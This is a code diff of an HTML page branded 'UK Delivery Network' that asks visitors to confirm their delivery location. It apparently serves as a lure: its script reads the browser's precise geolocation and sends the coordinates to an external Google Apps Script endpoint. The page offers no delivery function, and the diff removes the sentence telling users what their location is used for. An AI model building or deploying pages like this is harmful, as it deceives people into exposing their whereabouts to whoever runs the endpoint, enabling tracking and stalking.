@@ -1,8 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>UK Delivery Network - Delivery Location</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+<title>UK Delivery Network - Delivery Location</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1">
 
 <style>
 
@@ -33,29 +35,28 @@ body {
 }
 
 .tagline {
-  color: #666;
-  margin: 15px 0 30px;
+  color:#666;
+  margin:15px 0 30px;
 }
 
 h2 {
-  color: #0b1f3a;
+  color:#0b1f3a;
 }
 
 p {
-  line-height: 1.6;
-  color: #555;
+  color:#555;
+  line-height:1.6;
 }
 
 button {
-  background: #c9a227;
-  color: white;
-  border: none;
-  padding: 16px 30px;
-  border-radius: 50px;
-  font-size: 17px;
-  font-weight: bold;
-  cursor: pointer;
-  margin-top: 20px;
+  background:#c9a227;
+  color:white;
+  border:none;
+  padding:16px 30px;
+  border-radius:50px;
+  font-size:17px;
+  font-weight:bold;
+  cursor:pointer;
 }
 
 button:hover {
@@ -78,6 +79,7 @@ button:hover {
 
 </head>
 
+
 <body>
 
 <div class="card">
@@ -86,57 +88,62 @@ button:hover {
 UK Delivery Network
 </div>
 
+
 <div class="tagline">
 Fast • Reliable • Professional Delivery
 </div>
+
 
 <h2>
 Confirm your delivery location
 </h2>
 
+
 <p>
 To help ensure your delivery arrives smoothly, please confirm your location.
 </p>
 
-<p>
-Your device will ask for permission. Your location is only used to complete this delivery.
-</p>
 
 <button onclick="getLocation()">
 📍 Show Delivery Location
 </button>
 
+
 <p id="status"></p>
+
 
 <div class="footer">
 UK Delivery Network © 2026
 </div>
+
 
 </div>
 
 
 <script>
 
-function getLocation() {
+function getLocation(){
 
 const status = document.getElementById("status");
 
-if (!navigator.geolocation) {
 
-status.innerHTML = "Location is not supported on this device.";
+if(!navigator.geolocation){
+
+status.innerHTML="Location not supported";
 return;
 
 }
 
-status.innerHTML = "Requesting location...";
+
+status.innerHTML="Requesting location...";
 
 
 navigator.geolocation.getCurrentPosition(
 
-function(position) {
+function(position){
 
 
-const data = {
+let data = {
 
 latitude: position.coords.latitude,
 
@@ -148,34 +155,34 @@ longitude: position.coords.longitude
 fetch("https://script.google.com/macros/s/AKfycbw7gL-hqKmdnxaiikqJsqQ8ECGpjLTlD3CSxjdC-DFdeyMH8atEjiOZ5q2PcZtPbMPX/exec",
 {
 
-method: "POST",
+method:"POST",
 
-body: JSON.stringify(data)
+headers:{
+"Content-Type":"text/plain"
+},
 
-})
-
-
-.then(function(response){
-
-return response.text();
+body:JSON.stringify(data)
 
 })
 
 
-.then(function(text){
+.then(response=>response.text())
 
-status.innerHTML = "✓ Location received. Thank you.";
 
-console.log(text);
+.then(result=>{
+
+console.log(result);
+
+status.innerHTML="✓ Location received. Thank you.";
 
 })
 
 
-.catch(function(error){
+.catch(error=>{
 
 console.log(error);
 
-status.innerHTML = "Unable to send location.";
+status.innerHTML="Unable to send location.";
 
 });
 
@@ -185,7 +192,7 @@ status.innerHTML = "Unable to send location.";
 
 function(){
 
-status.innerHTML = "Location permission denied.";
+status.innerHTML="Location permission denied.";
 
 }
 
